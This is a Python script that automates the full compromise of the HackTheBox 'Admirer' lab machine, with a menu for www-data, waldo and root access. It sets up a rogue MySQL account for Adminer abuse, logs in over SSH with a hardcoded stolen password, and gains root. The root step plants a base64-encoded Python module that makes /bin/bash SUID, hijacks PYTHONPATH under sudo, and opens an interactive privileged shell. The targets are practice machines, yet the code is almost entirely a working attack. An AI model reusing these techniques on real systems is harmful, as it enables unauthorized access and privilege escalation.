import sys, os, requests, re, subprocess, paramiko
import time as cm
from colorama import Fore, init
from datetime import datetime
from questionary import Style, select
from consolemenu import SelectionMenu
from sshtunnel import SSHTunnelForwarder

class Tmsg:
    def __str__(self):
        return (Fore.LIGHTMAGENTA_EX + "⇛ [" +
                Fore.CYAN + datetime.now().strftime("%H:%M:%S") +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.YELLOW + "-" +
                Fore.LIGHTMAGENTA_EX + "[" + Fore.WHITE + "P4n3l" +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.YELLOW + "-" +
                Fore.LIGHTMAGENTA_EX + "[" + Fore.LIGHTGREEN_EX + "~" +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.LIGHTGREEN_EX + " ➤" + Fore.RESET)

init(autoreset=True)
custom_style = Style([
    ('qmark', 'fg:#FF5F87 bold'),
    ('question', 'fg:#017cff bold'),             
    ('answer', 'fg:#01ff4e bold'),     
    ('pointer', 'fg:#fbff00 bold'),    
    ('highlighted', 'fg:#00FFFF bold'),
    ('selected', 'fg:#22b9c5 bold'),        
    ('separator', 'fg:#6C6C6C bold'),
])

global machine_ip
global target_machine
global ln

def banner():
    os.system("clear")
    bnn = """
    
    ▓█████  ▄████▄   ██░ ██  ██ ▄█▀ ███▄ ▄███▓ ▒█████   █    ██   ██████ 
    ▓█   ▀ ▒██▀ ▀█  ▓██░ ██▒ ██▄█▒ ▓██▒▀█▀ ██▒▒██▒  ██▒ ██  ▓██▒▒██    ▒ 
    ▒███   ▒▓█    ▄ ▒██▀▀██░▓███▄░ ▓██    ▓██░▒██░  ██▒▓██  ▒██░░ ▓██▄   
    ▒▓█  ▄ ▒▓▓▄ ▄██▒░▓█ ░██ ▓██ █▄ ▒██    ▒██ ▒██   ██░▓▓█  ░██░  ▒   ██▒
    ░▒████▒▒ ▓███▀ ░░▓█▒░██▓▒██▒ █▄▒██▒   ░██▒░ ████▓▒░▒▒█████▓ ▒██████▒▒
    ░░ ▒░ ░░ ░▒ ▒  ░ ▒ ░░▒░▒▒ ▒▒ ▓▒░ ▒░   ░  ░░ ▒░▒░▒░ ░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░
     ░ ░  ░  ░  ▒    ▒ ░▒░ ░░ ░▒ ▒░░  ░      ░  ░ ▒ ▒░ ░░▒░ ░ ░ ░ ░▒  ░ ░
       ░   ░         ░  ░░ ░░ ░░ ░ ░      ░   ░ ░ ░ ▒   ░░░ ░ ░ ░  ░  ░  
       ░  ░░ ░       ░  ░  ░░  ░          ░       ░ ░     ░           ░  
           ░                                                             
    __________________________________________________________________________
    [+] Author: Ech0k   [+] G1thub: github.com/l44x   [+] T00l: HTB-Admirer
    __________________________________________________________________________\n"""
    print(Fore.RED + f"{bnn}")

tmsg = Tmsg()
ln = Fore.GREEN+"========================================="+Fore.RESET

def menu_panel():
    options=["[+] www-data", "[+] waldo", "[+] root", "[-] exit"]
    opcion = select(
        "Selecciona una opción:",
        choices=options,
        style=custom_style
    ).ask()
        
    return [opcion,options]

def commands_send(cmd):
    try:
        #subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        result = subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r {e}")

def hmsg(user,msg):
    return Fore.YELLOW+"["+Fore.GREEN+"@"+Fore.WHITE+f"{user}"+Fore.YELLOW+"]"+Fore.GREEN+"-"+Fore.YELLOW+"["+Fore.LIGHTMAGENTA_EX+"♛ "+Fore.WHITE+f"{msg}"+Fore.YELLOW+"]"

#------------------------------------------------------------------------

machine_ip=commands_send('ifconfig | grep destination | awk \'NF{print $NF}\'')
target_machine="10.10.10.187" # change this if change ip on htb.
client = paramiko.SSHClient()
host = target_machine
username = "waldo"
password = "&<h5b~yK3F#{PaPB&dA}{H>"

def checker_status():
    try:
        check_hackthebox_vpn="ifconfig | grep tun0"
        control_status_vpn=commands_send(check_hackthebox_vpn)
        cm.sleep(.5)
        if control_status_vpn:
            print(ln)
            print(tmsg,Fore.RED + f"[HackTheBoxVPN] > " + Fore.GREEN + f"Successful Connection ;)")
        else:
            print(tmsg,Fore.RED + f"[!] Actve ur HackTheBox VPN")
            sys.exit(1)
    except subprocess.CalledProcessError as e:
        print(tmsg,f"OcurredErr0r [Vpn-Status] {e}")

def default_cred_user():
    try:
        whoami_default=commands_send('whoami')
        machine_default_ip=commands_send(f'ping -c 1 {machine_ip} | grep "1 received" ');print(ln)
        print(tmsg,hmsg("user","Default User connection"))
        print(tmsg,Fore.RED + f"[HackTheBox - IP] > " + Fore.YELLOW + f"{machine_ip}")
        print(tmsg,Fore.RED + f"[User-default] > " + Fore.YELLOW + f"{whoami_default}")
        if machine_default_ip:
            print(tmsg,Fore.RED + f"[Target Machine] > " + Fore.YELLOW + f"{target_machine}")
            print(tmsg,Fore.RED + f"[Target Path Exploit] > " + Fore.YELLOW + f"${target_machine}");print(ln)
        else:
            print(tmsg,Fore.RED + f"\t\t\t[Target Machine] > " + Fore.RED + f"Checked BoardLight Network");print(ln)
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r [User-Default] {e}")


# sudo mysql -e "GRANT ALL PRIVILEGES ON *.* TO 'root'@'10.10.10.187' IDENTIFIED BY 'pwned' WITH GRANT OPTION;"
# sudo mysql -e "CREATE DATABASE pwned;"
# sudo mysql -e "USE pwned; CREATE TABLE exfil (data VARCHAR(256));"


def www_data_user_connection():
    cmd_send = f'sudo mysql -e "GRANT ALL PRIVILEGES ON *.* TO \'root\'@\'{target_machine}\' IDENTIFIED BY \'root123\' WITH GRANT OPTION;"'
    commands_send(cmd_send)
    commands_send('sudo mysql -e "CREATE DATABASE testing;"')
    commands_send('sudo mysql -e "USE testing; CREATE TABLE exfil (data VARCHAR(256));"')
    
    print(tmsg,Fore.LIGHTMAGENTA_EX + f"[Exploit Message - Server] > " + Fore.LIGHTWHITE_EX + f"🔑 {machine_ip}");cm.sleep(.4)
    print(tmsg,Fore.LIGHTMAGENTA_EX + f"[Exploit Message - Username] > " + Fore.LIGHTWHITE_EX + f"🔑 root");cm.sleep(.4)
    print(tmsg,Fore.LIGHTMAGENTA_EX + f"[Exploit Message - Password] > " + Fore.LIGHTWHITE_EX + f"🔑 root123");cm.sleep(.3)
    print(tmsg,Fore.LIGHTMAGENTA_EX + f"[Exploit Message - Database] > " + Fore.LIGHTWHITE_EX + f"🔑 testing");cm.sleep(.4)

def waldo_user_connection():
    
    # main_url = f"http://{target_machine}/utility-scripts/adminer.php"
    # sql_url= f"http://{target_machine}/utility-scripts/adminer.php?server=10.10.16.8&username=root&db=testing&sql="
    
    # user_control = requests.Session()
    
    # header = {
    #     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0',
    #     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    #     'Content-Type': 'application/x-www-form-urlencoded'
    # }
    
    # data = "auth%5Bdriver%5D=server&auth%5Bserver%5D=10.10.16.8&auth%5Busername%5D=root&auth%5Bpassword%5D=root123&auth%5Bdb%5D=testing"
    
    # get_values = user_control.get(main_url)
    # # print(get_values.cookies.get_dict())
    # cred_sid = get_values.cookies.get_dict().get("adminer_sid")
    # cred_key = get_values.cookies.get_dict().get("adminer_key")
    # header['Cookie'] = f"adminer_sid={cred_sid}; adminer_key={cred_key}; adminer_version=5.3.0"
    # user_control.post(main_url, headers=header, data=data)
    
    try:
        cm.sleep(.5)
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host, username=username, password=password)
        print(tmsg,Fore.RED + f"[Exploit Message] > " + Fore.YELLOW + f"Exploit on sql-command request file /var/ww/html/index.php")
        print(tmsg,Fore.RED + f"[Exploit Message - Connecting...] > " + Fore.LIGHTWHITE_EX + f"✔ Successful connection")
        print(tmsg,Fore.RED + f"[Exploit Message - Connecting...] > " + Fore.LIGHTWHITE_EX + f"✔ G00d H4ch1ng Duhhmhm :3")
        #init shell
        shell = client.invoke_shell()
        while True:
            if shell.recv_ready():
                output = shell.recv(1024).decode('utf-8')
                print(output, end="")
                
            command = input(f"{tmsg} ")
            if command.lower() in ["exit", "quit"]:
                print("\n[!] Closing connection...")
                break
            
            shell.send(command + "\n")
            cm.sleep(0.3)
            while shell.recv_ready():
                output = shell.recv(1024).decode('utf-8')
                print(output, end="")
        shell.close()
        client.close()
    except paramiko.ssh_exception.NoValidConnectionsError:
        print(tmsg,Fore.YELLOW + f"[Exploit - Connecting...] > " + Fore.RED + f"Failed Connection. Check ur connection vpn or machine.")


def root_user_connection():
    try:
        cm.sleep(.5)
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host, username=username, password=password)
        print(tmsg,Fore.RED + f"[Exploit Message] > " + Fore.YELLOW + f"Exploit on sql-command request file /var/ww/html/index.php")
        print(tmsg,Fore.RED + f"[Exploit Message - Connecting...] > " + Fore.LIGHTWHITE_EX + f"✔ Successful connection")
        print(tmsg,Fore.RED + f"[Exploit Message - Connecting...] > " + Fore.LIGHTWHITE_EX + f"✔ G00d H4ch1ng Duhhmhm :3")
        #init shell
        shell = client.invoke_shell()
        shell.send("export PYTHONPATH=/tmp" + "\n");cm.sleep(.3)
        shell.send("cd /tmp" + "\n");cm.sleep(.3)
        shell.send("touch shutil.py" + "\n");cm.sleep(.3)
        shell.send('echo aW1wb3J0IG9zCm9zLnN5c3RlbShcJ2NobW9kIHUrcyAvYmluL2Jhc2hcJykK | base64 -d > shutil.py' + "\n");cm.sleep(.3)
        shell.send("sudo PYTHONPATH=/tmp /opt/scripts/admin_taks.sh 6" + "\n");cm.sleep(.4)
        shell.send("&<h5b~yK3F#{PaPB&dA}{H>" + "\n");cm.sleep(.4)
        shell.send("bash -p " + "\n");cm.sleep(.3)
        
        while True:
            if shell.recv_ready():
                output = shell.recv(1024).decode('utf-8')
                print(output, end="")
                
            command = input(f"{tmsg} ")
            if command.lower() in ["exit", "quit"]:
                print("\n[!] Closing connection...")
                break
            
            shell.send(command + "\n")
            cm.sleep(0.3)
            while shell.recv_ready():
                output = shell.recv(1024).decode('utf-8')
                print(output, end="")
        shell.close()
        client.close()
    except paramiko.ssh_exception.NoValidConnectionsError:
        print(tmsg,Fore.YELLOW + f"[Exploit - Connecting...] > " + Fore.RED + f"Failed Connection. Check ur connection vpn or machine.")

def undected():
    try:
        checker_status();cm.sleep(.8)
        default_cred_user();cm.sleep(.8)
        print(Fore.YELLOW+f"=========================================")
        while True:
            opcion = menu_panel()
            print(Fore.YELLOW+f"=========================================")
            if opcion[0] == opcion[1][0]:
                print(tmsg,hmsg("user","www-data connection"))
                print(tmsg,Fore.LIGHTBLUE_EX +f"[www-data] > " + Fore.YELLOW + f"Path Exploit: http://{target_machine}/utility-scripts/adminer.php");cm.sleep(0.2)
                print(tmsg,Fore.LIGHTBLUE_EX +f"[www-data] > " + Fore.LIGHTMAGENTA_EX + f"✔ Local database for connection adminer.php");cm.sleep(0.2)
                www_data_user_connection()
                print(tmsg,Fore.LIGHTBLUE_EX +f"[www-data] > " + Fore.GREEN + f"✔ G00d H4ch1ng Duhhmhm :3");print(ln);cm.sleep(.2)
            elif opcion[0] == opcion[1][1]:
                print(tmsg,hmsg("user","waldo-Admirer user connection"))
                waldo_user_connection()
                print(tmsg,Fore.LIGHTBLUE_EX +f"[waldo-user] > " + Fore.GREEN + f"✔ G00d H4ch1ng Duhhmhm :3");print(ln)
            elif opcion[0] == opcion[1][2]:
                print(tmsg,hmsg("user","root-Admirer user connection"))
                print(tmsg,Fore.RED + f"[Exploit Message] > " + Fore.YELLOW + f"Exploit /opt/scripts/admin_taks.sh")
                root_user_connection()
                print(tmsg,Fore.LIGHTBLUE_EX +f"[waldo-user] > " + Fore.GREEN + f"✔ G00d H4ch1ng Duhhmhm :3");print(ln)
            elif opcion[0] == opcion[1][-1]:
                break
            else:
                break
    except:
        pass
    
if __name__ == '__main__':
    banner()
    undected()
